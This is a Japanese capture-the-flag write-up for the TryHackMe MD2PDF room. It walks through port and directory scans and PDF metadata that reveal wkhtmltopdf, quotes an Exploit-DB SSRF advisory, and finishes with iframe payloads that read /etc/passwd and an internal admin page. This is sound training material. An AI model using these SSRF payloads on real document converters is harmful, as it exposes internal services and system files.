# MD2PDF CTF

https://tryhackme.com/room/md2pdf

```text
Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?
```

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.174.196
root@ip-10-10-56-58:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 06:35 GMT
Nmap scan report for 10.10.174.196
Host is up (0.00015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 02:F2:BC:CB:6E:9F (Unknown)

root@ip-10-10-56-58:~# sudo nmap -sV -p22,80,5000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 06:35 GMT
WARNING: Service 10.10.174.196:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
WARNING: Service 10.10.174.196:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.174.196
Host is up (0.00014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  rtsp
5000/tcp open  rtsp
2 services unrecognized despite returning data.
```

80 ポートはテキスト入力すると PDF に変換される。

5000 ポートも同じような表示だが、jquery が置かれていないのでボタンを押しても反応しない。何か意味があるのか不明。

### gobuster

```shell
root@ip-10-10-56-58:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.196
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 166]
/convert              (Status: 405) [Size: 178]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/admin

```text
Forbidden
This page can only be seen internally (localhost:5000)
```

5000 ポートはローカルアクセス用の HTTP ポートらしい。  
ただ、同じディレクトリを参照しているわけではないと思われる。

## PDF 変換

```js
$(document).ready(function () {
  var editor = CodeMirror.fromTextArea(document.getElementById("md"), {
    mode: "markdown",
    lineNumbers: true,
    tabSize: 2,
    lineWrapping: true,
  });
  $("#convert").click(function () {
    const data = new FormData();
    data.append("md", editor.getValue());
    $("#progress").show();

    fetch("/convert", {
      method: "POST",
      body: data,
    })
      .then((response) => response.blob())
      .then((data) => window.open(URL.createObjectURL(data)))
      .catch((error) => {
        $("#progress").hide();
        console.log(error);
      });
  });
});
```

ajax で/convert POST が実行されている。

### メタデータ

```shell
$ exiftool ./document.pdf
ExifTool Version Number         : 12.76
File Name                       : document.pdf
Directory                       : .
File Size                       : 6.0 kB
File Modification Date/Time     : 2025:02:18 02:00:39-05:00
File Access Date/Time           : 2025:02:18 02:00:49-05:00
File Inode Change Date/Time     : 2025:02:18 02:00:39-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           :
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2025:02:18 07:00:26Z
Page Count                      : 1
```

wkhtmltopdf 0.12.5 が使われている。

```shell
$ searchsploit wkhtmltopdf
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
wkhtmltopdf 0.12.6 -  Server Side Request Forgery                                 | asp/webapps/51039.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

SSRF の脆弱性がある

```text
$ cat /usr/share/exploitdb/exploits/asp/webapps/51039.txt
# Exploit Title: wkhtmltopdf 0.12.6 -  Server Side Request Forgery
# Date: 20/8/2022
# Exploit Author: Momen Eldawakhly (Cyber Guy)
# Vendor Homepage: https://wkhtmltopdf.org
# Software Link: https://wkhtmltopdf.org/downloads.html
# Version: 0.12.6
# Tested on: Windows ASP.NET <http://asp.net/>

POST /PDF/FromHTML HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

__RequestVerificationToken=Token&header=<PDFstructure+>....&data= <PDFstructure+>....<iframe+src=“http://10.10.10.1”>
```

## エクスプロイト

これや

```text
<iframe+src="http://localhost:5000/admin"></iframe>
```

これは駄目だったが、

```text
<iframe src="file:///etc/passwd"></iframe>
```

これで

```text
<iframe src="http://localhost:5000/admin"></iframe>
```

フラグゲット

## 振り返り

- PDF のメタデータを見るのをすぐに思いついたのは良かった。
- SSRF の脆弱性を見つけるまでは非常に順調だったが。
- 51039.txt に引きずられて「iframe+src」にこだわっていたのと、iframe の中のダブルクォートが全角になっていたケアレスミスなどが重なり、1 時間以上は無駄にしてしまった。
